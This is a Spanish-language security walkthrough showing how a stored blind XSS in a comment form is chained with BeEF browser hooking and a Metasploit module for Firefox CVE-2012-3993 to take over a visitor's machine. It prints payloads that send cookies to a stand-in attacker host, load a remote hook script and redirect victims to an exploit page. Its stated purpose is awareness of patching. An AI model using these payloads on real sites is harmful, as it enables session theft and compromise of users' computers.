#  XSS + WEBHOOK
### Resumen
En este paper se explicará como de un simple xss se puede llegar a vulnerar un sistema desactualizado (con un navegador desactualizado). En esta ocasión se aplican varias técnicas para llegar al proposito de generar un rce, como por ejemplo XSS, WEBHOOK, CVE's, y persistencia.

### PoC

Tenemos el siguiente formulario con una vulnerabilidad xss stored (blind) el cual nos puede servir para robar cookies de cualquier usuario que llegue a visitar la sección "comentarios" de ese sitio. La vulnerabilidad se pudo encontrar ya que al ver el formulario de comentarios se pudo observar que no muestra ningún alert sin embargo sí guarda nuestro codigo en la pagina principal.

![image](https://user-images.githubusercontent.com/78449089/128909869-49cc4706-2f57-48cd-9730-b9494576afe8.png)

Para comprobar que es blind, se solicitará un recurso a un web tercero (en este caso seriamos nosotros como atacantes).

![image](https://user-images.githubusercontent.com/78449089/128912972-a28275dd-84fb-4ccc-9049-01eb32bfa0f5.png)

este fue el payload que se utilizó para comprobarlo y el resultado fue una request hacia nuestro servidor.

![image](https://user-images.githubusercontent.com/78449089/128913148-740cdd41-226b-4aec-924b-26c2fe425a4d.png)

En este caso, nosotros mismos pedimos ese recurso pero ¿y si a la vez que pedimos el recurso hacia nuestra web, enviamos también la cookie?
Pues una vez puesto a prueba eso, obtenemos la siguiente cookie.

![image](https://user-images.githubusercontent.com/78449089/128913816-2358864a-0fba-482d-b33b-ad2f99df4edb.png)

payload: `"><img src=x onerror="javascript:document.location='http://ATACANTE.COM?c='+document.cookie"></img>`

Ahora que tenemos el escenario puesto y una vulnerabilidad, es aquí cuando debemos ser más creativos y pensar qué podemos llevar a cabo con ese vector.
Investigando muy a fondo encontré que con [beef-xss](https://beefproject.com) se pueden realizar ataques muy guapos pero en este caso nos vamos a concentrar en uno muy especifico, encontrar navegadores vulnerables con algún cve.

Para ello tenemos que hacer un par de cosas para realizar tal hazaña. Primeramente utilizaremos nuestro anterior xss encontrado para inyectar el codigo js que nos provee beef-xss.

Una vez ejecutado beef, nos da un js el cual debemos poner dentro del formulario vulnerable para que cuando un usuario entre a esa sección, su navegador quede hookeado.

![image](https://user-images.githubusercontent.com/78449089/128918746-8bd9acfe-4fac-47de-9339-741ce2676f13.png)

el payload sería algo así: `<img src=x onerror="$.getScript('http://atacante.com/hook.js')"/>`

![image](https://user-images.githubusercontent.com/78449089/128928700-95184d85-e94f-422f-bbac-d02506ed6ece.png)

Como podemos ver, tenemos un navegador hookeado. El navegador estará hookeado mientras tenga la pestaña abierta justo donde está alojado nuestro xss, si el usuario cierra esa página nuestro hookeo se caerá y no podremos hacer nada.

Bien, ahora que tenemos todo sobre la mesa, sigue buscar si el navegador que tenemos hookeado tiene alguna vulnerabilidad. Tenemos la siguiente información:

![image](https://user-images.githubusercontent.com/78449089/128934982-3fb0deac-e927-4860-a240-76d5837166c3.png)

Podemos ver algo muy interesante y es que el navegador actual, tiene como version la 10.0 y si hacemos una busqueda rapida encontramos que todos los navegadores firefox desde versión 5.0 hasta la 15.0 son vulnerables al [CVE-2012-3993](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3993)

Después de una larga busqueda sobre ese CVE, encontré un modulo en metasploit que puede desplegar esa vulnerabilidad y tomar control de la pc victima.
(TAMBIÉN EL PLUGIN ES VULNERABLE)

El modulo a utilizar es [este](https://vulners.com/metasploit/MSF:EXPLOIT/MULTI/BROWSER/FIREFOX_PROTO_CRMFREQUEST)

Una vez ejecutando el modulo con todas sus opciones configuradas nos arrojará una url, la cual debemos poner dentro de nuestro xss encontrado anteriormente para así mandar a la victima a un sitio donde se le es descargado un payload para explotar la mencionada vulnerabilidad.

el payload sería algo así: `"><img src=x onerror="javascript:document.location='http://ATACANTE.COM/LZ91C3H4EI'"></img>`

![image](https://user-images.githubusercontent.com/78449089/128937355-413f2f20-1450-46ee-92e4-b22654e83ad7.png)

Una vez inyectado nuestro payload, se verá algo como esto y damos por hecho que nuestro trabajo ha terminado... victima pwneada.


Por eso es muy importante actualizar nuestros navegadores, ya que allá fuera siguen existiendo muchos navegadores vulnerables a este y otro tipo de vectores, principalmente en servidores viejos que están por ahí. Aquí se demuestra como un simple xss puede tener un impacto grandisimo si se lleva a cabo en conjunto a otras cosas.


Contacto: [Linkedin](https://www.linkedin.com/in/jairr/) [Twitter](https://twitter.com/_niggurath_)




